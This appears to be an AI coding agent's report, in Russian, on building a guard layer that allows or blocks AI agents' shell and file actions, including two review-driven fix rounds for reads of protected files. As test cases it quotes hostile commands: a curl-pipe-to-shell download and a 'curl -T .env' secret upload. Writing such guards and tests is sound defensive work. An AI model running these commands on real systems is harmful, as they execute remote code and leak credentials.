# Task 6 — Ступень 1: профиль, allowlist, слот пакетов, цепочка

**Статус:** закрыт. **Ветка:** `feat/agentgate-task-1`. **Базовый коммит:** `e53e1ac` (merge task 5, после исправления базы worktree — см. «Решения» ниже).

## Что построено

| Файл | Содержимое |
|---|---|
| `service/agentgate/stage1/profile_check.py` | `check_profile(action, profile) -> Stage1Decision \| None`: запрещает мутирующие shell-команды (`rm mv cp mkdir rmdir touch chmod chown tee install ln truncate dd shred`, плюс `sed -i` и редиректы `>`/`>>`) и `file_write`, чья цель выходит за `profile.resolved_allowed_paths()` (`profile.path`); проверяет `action.domains` против `profile.network.allowed_domains` — `deny` при режиме `off`/`allowlist`, `ask` при `ask`, ничего при `open` (`profile.domain`) |
| `service/agentgate/stage1/allowlist.py` | `check_allowlist(action, profile) -> Stage1Decision \| None`: `allow` для `file_read`/`file_write` с путями внутри `resolved_allowed_paths()` (запись дополнительно исключает `resolved_protected_paths()` через `matches_any`) — `allowlist.file_read`/`allowlist.file_write`; для shell — `allow`, когда все команды совпадают с операторским `safe_prefixes` (`allowlist.prefix`) либо входят в фиксированный список read-only команд/read-only git-подкоманд (`allowlist.readonly`), при условии, что все пути остаются в workspace и нет `eval`/подстановки команд |
| `service/agentgate/stage1/packages.py` | `check_packages(action, profile) -> None` — заглушка на будущую проверку slopsquatting/пакетов, всегда пропускает |
| `service/agentgate/stage1/chain.py` | `CHECKS: list[Check] = [check_hard_deny, check_profile, check_allowlist, check_packages]`; `run_stage1(action, profile)` — первый не-`None` результат в этом порядке |

`check_hard_deny` (задача 5) не переписан — импортирован напрямую из `agentgate.stage1.hard_deny`. Сопоставление путей и glob-паттернов — исключительно через `is_within`/`matches_any`/`resolve_path` из `agentgate.normalize.paths` (задача 4); ручного сравнения строк нигде нет.

Реализация выполнена по коду из брифа `docs/superpowers/service/sdd/task-6-brief.md` дословно. Перед написанием кода я сверил каждый импортируемый брифом символ с уже смёрженной реализацией задач 3–5 (`Stage1Decision`, `Check`, `is_within`, `matches_any`, `resolve_path`, `NormalizedAction`, `SimpleCommand`, `Profile`, `NetworkMode`, `DecisionKind`, `Tool`, `DecideRequest`, `with_workspace`, `check_hard_deny`, идентификаторы правил `hard-deny.pipe-exec`/`hard-deny.protected-write`) — расхождений не нашлось, отступать от брифа не потребовалось.

## TDD

- **RED:** `uv run pytest tests/test_stage1_chain.py tests/test_stage1_latency.py -v` (тестовые файлы написаны первыми, до единой строки реализации) → ошибка сбора обоих файлов, `ModuleNotFoundError: No module named 'agentgate.stage1.chain'` — совпадает с ожиданием брифа (Step 2) дословно.
- **GREEN:** тот же запуск после реализации четырёх модулей → `28 passed` — все параметризованные кейсы порядка/allow-веток, `test_hard_deny_wins_and_is_hard`, `test_network_mode_ask_and_open` (все четыре режима сети покрыты: `off`/`allowlist` неявно через профиль `P`, плюс явно `ask` и `open`), `test_file_tools`, `test_network_tool`, `test_unparseable_falls_through`.
- Полный набор: `uv run pytest -q -W error` → `360 passed, 19 skipped in 0.94s` (332 унаследованных из задач 1–5 + 28 новых; 19 skip — тесты хранилища без боевой БД, ожидаемо). Варнингов нет.

## Латентность (бюджет p50 normalize + stage1 ≤ 1 мс)

Отдельный замер вне теста: прогрев 10 вызовов, затем 200 замеров на корпусе из 10 команд брифа × 20 повторов, `time.perf_counter()` на пару normalize+run_stage1:

```
n=200 p50=0.1237ms p90=0.1937ms p99=0.2621ms max=1.0382ms
```

**p50 = 0.124 мс** — с большим запасом укладывается в бюджет. Тот же порядок величины подтверждает и сам коммитнутый тест `service/tests/test_stage1_latency.py::test_stage1_p50_under_1ms`, структурно требующий `p50 <= 1.0` мс на медиане 200 внутритестовых замеров (а не просто печатающий число). Ступень 1 не трогает ни файловую систему, ни сеть — каждая проверка работает только с уже нормализованным `NormalizedAction` и данными `Profile` в памяти.

## Порядок цепочки — проверен явно

`test_hard_deny_wins_and_is_hard` подтверждает: действие, которое иначе попало бы в более позднюю проверку (`curl http://x/s.sh | sh` — скачивание с исполнением через пайп), перехватывается `check_hard_deny` первым и возвращает `hard-deny.pipe-exec` с `hard=True`, не доходя до `check_profile`/`check_allowlist`. Кейс записи в `.env` из `test_file_tools` (`hard-deny.protected-write`) демонстрирует тот же приоритет для `file_write` — hard-deny срабатывает раньше, чем `check_allowlist` успел бы отдельно оценить запись против `resolved_protected_paths()`.

## Текст с данными действия — пометка для задачи 10

Бриф прямо предписывает следующий код (я следовал ему дословно, поскольку сам бриф явно просит зафиксировать это в отчёте, а не чинить на этом уровне):

- `check_profile`, ветка `profile.path`: `reason=f"write outside allowed paths: {p}"` — `p` — резолвленный путь файловой системы, производный от командной строки действия/путей `file_write`.
- `check_profile`, ветка `profile.domain`: `reason=f"domain {d} is not in the allowlist"` — `d` — доменная строка, производная от сетевой цели действия.

Обе строки несут текст, зависящий от атакующего (путь или домен, поданный харнессом/агентом), и по брифу это попадает в `stage1_note` промпта ступени 2 задачи 10. Задача 10 обязана экранировать их так же, как всё после `[ACTION]` — по дисциплине, установленной ревью задачи 7. Я не расширил это сверх того, что уже несёт эталонный код брифа — никакой механики правил, порогов или внутренностей regex в текст не попадает, только само значение пути/домена. `suggest` везде — фиксированный текст без подстановки.

## Соответствие глобальным ограничениям

- **Hard-deny не переопределяется:** `CHECKS` начинается с `check_hard_deny`, и `run_stage1` возвращает первый не-`None` результат — более позднему `check_profile`/`check_allowlist` физически негде переписать уже принятое решение.
- **Чтение вне workspace не запрещается профилем:** `_mutating_targets` в `check_profile` собирает цели только из фиксированного набора мутирующих команд, `sed -i`, редиректов записи и `file_write` — `cat /etc/hosts` (`file_read` вне workspace) в этот список не попадает и проходит цепочку без срабатывания, что подтверждено тестами `test_chain_falls_through["cat /etc/hosts"]` и `test_file_tools`.
- **Не решаем по сырой строке:** `check_profile`/`check_allowlist`/`check_packages`/`run_stage1` принимают только `NormalizedAction` и `Profile`; `action.raw` нигде не читается.

## Дисциплина по scope

Не реализовано ничего сверх четырёх функций и `CHECKS`, которые перечисляет бриф — никаких дополнительных проверок. Не создано ничего вне `service/agentgate/stage1/`, двух тестовых файлов и отчётов. `service/.env` не читался, не печатался, не перемещался.

## Отложено (в следующие задачи)

- Реальная логика `check_packages` (slopsquatting/проверка пакетов) — не входит в v1, заглушка возвращает `None` намеренно.
- Экранирование `stage1_note` в промпте ступени 2 — задача 10, отмечено выше.

## Изменённые файлы

- `service/agentgate/stage1/profile_check.py` (новый)
- `service/agentgate/stage1/allowlist.py` (новый)
- `service/agentgate/stage1/packages.py` (новый)
- `service/agentgate/stage1/chain.py` (новый)
- `service/tests/test_stage1_chain.py` (новый)
- `service/tests/test_stage1_latency.py` (новый)
- `reports/task-6-stage1-chain.md` (этот файл)

## Решения, принятые за пользователя

### Исправление базового коммита worktree

Worktree был создан харнессом от `a9a0edd` (docs: план на 13 задач), а не от требуемого `e53e1ac` (merge task 5). Рабочее дерево было чистым, `git merge-base --is-ancestor HEAD e53e1ac` подтвердил чистый fast-forward — выполнен `git reset --hard e53e1ac`. После сброса подтверждено: `service/agentgate/stage1/hard_deny.py`, `service/agentgate/normalize/__init__.py`, `service/agentgate/profiles/schema.py` существуют, `uv run pytest -q` даёт `332 passed, 19 skipped` до начала работы над задачей — совпадает с ожиданием брифа дословно.

---

## Fix round 1 — auto-allow чтения защищённого пути через readonly-allowlist

**База фикса:** `3a806b5` (коммит этой задачи).

### Находка

Ревью координатора (частично потеряно из-за инфраструктурной ошибки 403, но воспроизведено напрямую) обнаружило: `check_allowlist` возвращал жёсткий `allow` для `cat .env` при профиле с `protected_paths=[".env*", ".git/hooks/**"]`, правило `allowlist.readonly`. `.env` — защищённый путь; `curl -T .env` перехватывается `hard-deny.exfil`, но обычные `cat .env`/`head .env`/`grep X .env` проходили через readonly-ветку allowlist с явным благословением `allow`, поскольку короткое замыкание readonly-команды в `check_allowlist` вообще не сверялось с `resolved_protected_paths()`. Воспроизведено до любых правок:

```
cat .env                    -> allow  allowlist.readonly  hard=False
head .env                   -> allow  allowlist.readonly  hard=False
grep X .env                 -> allow  allowlist.readonly  hard=False
cat .git/hooks/pre-commit   -> allow  allowlist.readonly  hard=False
```

### Решение координатора

Чтение защищённого пути не должно возвращать `allow` из `check_allowlist` — должно возвращать `None`, и действие уходит в ступень 2 (то же обращение, что уже получает `cat /etc/hosts` — вне `allowed_paths`). Не эскалировано до `deny`: у чтения защищённого файла есть легитимные случаи (инструмент, инспектирующий конфиг), а `deny` здесь было бы избыточным запретом. `rm .env`/удаление защищённых путей явно вынесено за пределы этой правки — территория `hard-deny.protected-write` задачи 5, отдельный сквозной вопрос, который координатор отслеживает отдельно; `hard_deny.py` не тронут.

### Фикс

`service/agentgate/stage1/allowlist.py`:
- Ветка `Tool.file_read`: добавлено `and not matches_any(p, protected, profile.workspace)` к существующему условию `is_within(p, allowed)` — зеркально тому, что уже было у `file_write`.
- Shell-ветка: добавлена одна проверка между существующей проверкой «все пути внутри workspace» и ветками allow для prefix/readonly — `if action.paths and any(matches_any(p, protected, profile.workspace) for p in action.paths): return None`. Одна проверка закрывает и `allowlist.readonly`, и `allowlist.prefix`, так как стоит выше обеих точек возврата, а `action.paths` (заполняется нормализатором для shell-действий через `PATH_COMMANDS`, куда входят `cat`/`head`/`grep`) уже несёт все пути, упомянутые командой, независимо от роли чтения/записи.

  **ИСПРАВЛЕНИЕ (fix round 2):** утверждение выше — что `action.paths` «уже несёт все пути, упомянутые командой» — неверно, и это ровно та ложная предпосылка, которую нашло и воспроизвело ревью раунда 2. `NormalizedAction.paths` заполняется нормализатором только для команды из `PATH_COMMANDS` (`normalize/shell.py`) либо для токена, независимо прошедшего `looks_like_path`. Команда из `READONLY`, но вне `PATH_COMMANDS` (`sort`, `cut`, `diff`, `uniq` — все в `allowlist.READONLY`, но ни одна не в `PATH_COMMANDS`), читающая путь с голым именем (без `/`, не чувствительный basename — например, `AGENTS.md`/`SKILL.md`/`.cursorrules` из шаблонного `default-dev.yaml`), давала `action.paths == []`, и эта проверка никогда не срабатывала. См. раздел «Fix round 2» ниже — реальный фикс через общий помощник `command_argv_paths`, а не через `action.paths`.
- Использованы только `matches_any`/`is_within` из `agentgate.normalize.paths` (задача 4) — без ручного сравнения путей.
- Докстринг модуля обновлён: защищённый путь никогда не благословляется этим модулем ни на чтение, ни на запись, и это осознанный `None` (уход в ступень 2), а не `deny`.

### TDD

- **RED:** добавлен `test_allowlist_does_not_bless_protected_reads` (параметризован: `cat .env`, `head .env`, `grep X .env`, `cat .git/hooks/pre-commit`, каждый проверяет `check_allowlist(...) is None` и что `run_stage1(...)` не `allow`), плюс два теста-страховки от переисправления, в `service/tests/test_stage1_chain.py`, затем запуск:
  ```
  uv run pytest tests/test_stage1_chain.py -v -k "protected_reads or ordinary_reads or falls_through_like"
  ```
  Результат: `4 failed, 2 passed` — все четыре кейса защищённого пути упали на `assert Stage1Decision(decision=<DecisionKind.allow: 'allow'>, rule_id='allowlist.readonly', ...) is None`, подтверждая ровно ту находку, что описал координатор; два теста-страховки уже проходили на дефектном коде — как и задумано, они ловят переисправление, а не саму находку.
- **GREEN:** тот же запуск после фикса → `6 passed, 27 deselected`.
- Полный набор: `uv run pytest -q -W error` → `366 passed, 19 skipped in 0.94s` (360 + 6 новых), варнингов нет.

### Покрытие

- `cat .env`, `head .env`, `grep X .env`, `cat .git/hooks/pre-commit` — каждый даёт `None` и от `check_allowlist` напрямую, и от `run_stage1` (никакое другое правило не срабатывает: у hard-deny нет правила на просто чтение dotfile, `check_profile` не срабатывает — это чтение, а не мутирующая команда).
- Страховка от переисправления: `cat README.md`, `ls src/` (незащищённые пути внутри workspace) по-прежнему дают `allow`/`allowlist.readonly` — обычные чтения не запрещены избыточно.
- `cat /etc/hosts` по-прежнему даёт `None`, без изменений (вне `allowed_paths`, было `None` и до фикса — этот путь вообще не доходит до новой проверки защищённых путей, так как отсекается более ранней проверкой containment по workspace).

### Латентность — повторный замер

Фикс добавляет один проход `matches_any` по `action.paths` на горячем пути shell (плюс уже существовавший вызов `matches_any` для `file_read`/`file_write`, теперь применённый и к `file_read`). Повторный замер тем же скриптом (прогрев 10, 200 замеров, корпус 10 команд × 20 повторов):

```
n=200 p50=0.1219ms p90=0.2059ms p99=0.2399ms max=0.9573ms
```

**p50 = 0.122 мс** — статистически неотличимо от 0.124 мс до фикса, с большим запасом в бюджете 1 мс. `tests/test_stage1_latency.py::test_stage1_p50_under_1ms` перезапущен отдельно и проходит.

### Дисциплина по scope

Исправлена ровно одна находка по решению координатора; `hard_deny.py` не тронут, `rm .env` не переведён в `deny` (сознательно оставлено координатору). Использованы только `is_within`/`matches_any`. `None`, а не `deny` — подтверждено ассертами в новых тестах. `git status --short` после фикса показывает только `service/agentgate/stage1/allowlist.py` и `service/tests/test_stage1_chain.py` — без расширения scope.

### Изменённые файлы, fix round 1

- `service/agentgate/stage1/allowlist.py` — проверка защищённого пути добавлена в `file_read` и в общую shell-ветку; докстринг обновлён.
- `service/tests/test_stage1_chain.py` — 6 новых тестов (4 параметризованных + 2 страховки).
- `reports/task-6-stage1-chain.md` — этот раздел.

---

## Fix round 2 — проверка защищённого чтения была неполной

**База фикса:** `181a648` (коммит раунда 1).

### Находка (Critical)

Полное ревью подтвердило: раунд 1 закрыл кейс `.env` различающим тестом, а порядок, режимы домена, переиспользование хелперов и латентность — верны. Но проверка раунда 1 была привязана к `NormalizedAction.paths`, а это не полный набор путей, которые трогает команда: нормализатор добавляет токен в `action.paths` только если команда входит в `PATH_COMMANDS` (`normalize/shell.py`) либо токен независимо проходит `looks_like_path` (ведущий `/`, `./`, `../`, `~`, содержит `/`, либо это захардкоженный чувствительный basename). Команда из `READONLY`, но вне `PATH_COMMANDS`, читающая путь с голым именем — выпадает из поля зрения `action.paths` полностью.

Воспроизведено на шаблонном `service/profiles/default-dev.yaml`, чьи `protected_paths` включают голые имена `AGENTS.md`, `SKILL.md`, `.cursorrules`:

```
sort AGENTS.md            -> allow allowlist.readonly   paths=[]
cut -d: -f1 AGENTS.md     -> allow allowlist.readonly   paths=[]
diff AGENTS.md README.md  -> allow allowlist.readonly   paths=[]
uniq SKILL.md             -> allow allowlist.readonly   paths=[]
sort .cursorrules         -> allow allowlist.readonly   paths=[]
pytest AGENTS.md          -> allow allowlist.prefix     paths=[]
```

(`sort`, `cut`, `diff`, `uniq` — все в `allowlist.READONLY`, но ни одна не в `PATH_COMMANDS`, поэтому нормализатор никогда не резолвит их голые аргументы в `action.paths` — проверка раунда 1, завязанная на `action.paths`, их молча не видела.) Это ровно та ложная предпосылка, что исправлена выше в разделе раунда 1.

### Решение координатора

Не полагаться на `action.paths` для проверки защищённого чтения. Для каждой команды действия перечислить её собственные не-флаговые argv-токены, резолвить каждый относительно `action.cwd` и сверить с `resolved_protected_paths()`. Переиспользовать уже существующую машинерию перечисления токенов из `profile_check._mutating_targets`, а не писать вторую копию — вынести в общий helper, раз она была приватной для `profile_check`. При совпадении любого резолвленного токена с защищённым путём — `check_allowlist` возвращает `None` (уход в ступень 2), не `allow`; эскалация до `deny` не требуется — то же обращение, что и в раунде 1.

### Фикс

**Новый файл `service/agentgate/stage1/argv_paths.py`** — общий небольшой модуль (не встроен в `profile_check.py`, чтобы `allowlist.py` не зависел от прочих внутренностей `profile_check.py`; обе проверки ступени 1 зависят от этого нового листового модуля, а не друг от друга):
```python
def command_argv_paths(cmd: SimpleCommand, cwd: str) -> list[str]:
    return [resolve_path(a, cwd) for a in cmd.argv[1:] if not a.startswith("-")]
```
Резолвит каждый не-флаговый argv-токен команды (кроме `argv[0]`, исполняемого файла) относительно `cwd` — сознательно независимо от `PATH_COMMANDS`/`looks_like_path`: каждый не-флаговый аргумент безусловно считается потенциальным путём, что консервативно для хелпера, чей результат используется только для перехода к менее разрешающему исходу.

**`service/agentgate/stage1/profile_check.py`** — `_mutating_targets` переписана на вызов `command_argv_paths(c, action.cwd)` вместо собственного `[resolve_path(a, action.cwd) for a in args]`. Список результатов побайтово идентичен для всех существующих случаев (в т.ч. особый случай `sed -i`, который должен пропустить первый не-флаговый токен — скрипт замены — теперь делает `argv_paths[1:]` вместо повторной фильтрации `c.argv[1:]`; семантика не изменилась). Поведение `check_profile` не изменилось — подтверждено: полный набор проходит без единого изменения в `test_stage1_hard_deny.py` и в базовых/раунд-1 кейсах `test_stage1_chain.py`.

**`service/agentgate/stage1/allowlist.py`** — источник проверки заменён:
```python
# было (раунд 1, неполно):
if action.paths and any(matches_any(p, protected, profile.workspace) for p in action.paths):
    return None
# стало (раунд 2):
if any(
    matches_any(p, protected, profile.workspace)
    for c in action.commands
    for p in command_argv_paths(c, action.cwd)
):
    return None
```
Теперь перебираются argv каждой команды напрямую (а не то, что нормализатор случайно собрал в `action.paths`), поэтому ловятся `sort AGENTS.md`, `cut -d: -f1 AGENTS.md`, `diff AGENTS.md README.md`, `uniq SKILL.md`, `sort .cursorrules` и кейс prefix-ветки `pytest AGENTS.md` — ни один из которых проверка раунда 1 не видела. Докстринг модуля расширен пояснением этого различия.

**Minor — удалён мёртвый параметр.** `_is_readonly(cmd, cwd_paths_ok)` принимал `cwd_paths_ok`, но нигде не читал его, и всегда вызывался с `True`. Параметр удалён; точка вызова обновлена до `_is_readonly(c)`.

### TDD

- **RED:** новые тесты написаны первыми (против кода раунда 1, до правок `allowlist.py`/`profile_check.py`/нового `argv_paths.py`):
  ```
  uv run pytest tests/test_stage1_chain.py -v -k "outside_path_commands or bare_name"
  ```
  Результат: `6 failed, 4 passed` — все пять параметризованных кейсов `allowlist.readonly` и кейс `allowlist.prefix` упали на `assert Stage1Decision(decision=<DecisionKind.allow: 'allow'>, ...) is None`, воспроизводя находку координатора дословно, включая на реальном шаблонном `default-dev.yaml` (не на синтетическом фикстур-профиле). Четыре страховочных кейса на незащищённые пути уже проходили на дефектном коде — как и задумано.
- **GREEN:** тот же запуск после фикса → `16 passed, 27 deselected` (включая тесты раунда 1, перепроверенные без регрессии).
- Полный набор: `uv run pytest -q -W error` → `376 passed, 19 skipped in 0.93s` (366 + 10 новых), варнингов нет.

### Покрытие

- Readonly-ветка, команда вне `PATH_COMMANDS`, голое имя защищённого пути: `sort AGENTS.md`, `cut -d: -f1 AGENTS.md`, `diff AGENTS.md README.md`, `uniq SKILL.md`, `sort .cursorrules` — все дают `None` от `check_allowlist` и не-`allow` от `run_stage1`, на шаблонном `default-dev.yaml`.
- Эквивалент для prefix-ветки: `pytest AGENTS.md` (совпадает с `safe_prefixes: [["pytest"], ...]`, `pytest` вне `PATH_COMMANDS`) — то же обращение.
- Страховки: те же команды на незащищённых голых именах (`sort data.txt`, `cut -f1 report.csv`, `diff data.txt report.csv`, `pytest data.txt`) по-прежнему дают `allow` с ожидаемым `rule_id`.
- Тесты раунда 1 (`cat .env`, `head .env`, `grep X .env`, `cat .git/hooks/pre-commit`, обычные чтения, `cat /etc/hosts`) перепроверены — без регрессии.

### Латентность — повторный замер

Фикс заменяет один проход по `action.paths` на вложенный цикл по argv каждой команды (через `command_argv_paths`, вызывающую `resolve_path` на каждый не-флаговый токен) — строго больше работы на горячем пути, чем в раунде 1. Повторный замер тем же скриптом (прогрев 10, 200 замеров, корпус 10 команд × 20 повторов):

```
n=200 p50=0.1409ms p90=0.2110ms p99=0.2729ms max=0.8467ms
```

**p50 = 0.141 мс** — выросло с 0.122 мс в раунде 1 (дополнительное перечисление argv действительно стоит времени), но по-прежнему с большим запасом в бюджете 1 мс (~7×). `tests/test_stage1_latency.py::test_stage1_p50_under_1ms` перезапущен отдельно и проходит.

### Дисциплина по scope

Переиспользована машинерия перечисления токенов из `profile_check` через новый общий листовой модуль (`argv_paths.py`), а не вторая копия. `None`, не `deny`, сохранён — каждый новый тест напрямую проверяет `check_allowlist(...) is None`. Использован реальный шаблонный `default-dev.yaml` (через `load_profiles`, тот же паттерн, что и `tests/test_profiles.py::test_shipped_default_profile_loads`), а не синтетический профиль — по явному указанию. Мёртвый параметр `cwd_paths_ok` удалён, а не «подключён» — он не делал ничего и всегда вызывался с `True`; придумывать для него новое поведение значило бы выйти за рамки того, что просило ревью. `hard_deny.py` не тронут. `git status --short` после фикса показывает ровно: `service/agentgate/stage1/allowlist.py`, `service/agentgate/stage1/profile_check.py` (изменены), `service/agentgate/stage1/argv_paths.py` (новый), `service/tests/test_stage1_chain.py` (изменён) — без расширения scope.

### Изменённые файлы, fix round 2

- `service/agentgate/stage1/argv_paths.py` (новый) — общий helper `command_argv_paths`.
- `service/agentgate/stage1/profile_check.py` — `_mutating_targets` переписана на общий helper; поведение не изменилось.
- `service/agentgate/stage1/allowlist.py` — проверка защищённого пути переписана на перечисление argv по каждой команде через общий helper вместо `action.paths`; удалён мёртвый параметр `_is_readonly`; докстринг расширен.
- `service/tests/test_stage1_chain.py` — 10 новых тестов (5 параметризованных readonly + 1 prefix + 4 страховки), с загрузкой шаблонного `default-dev.yaml` через `load_profiles`.
- `reports/task-6-stage1-chain.md` — этот раздел, плюс исправление ложного утверждения в разделе раунда 1 выше.
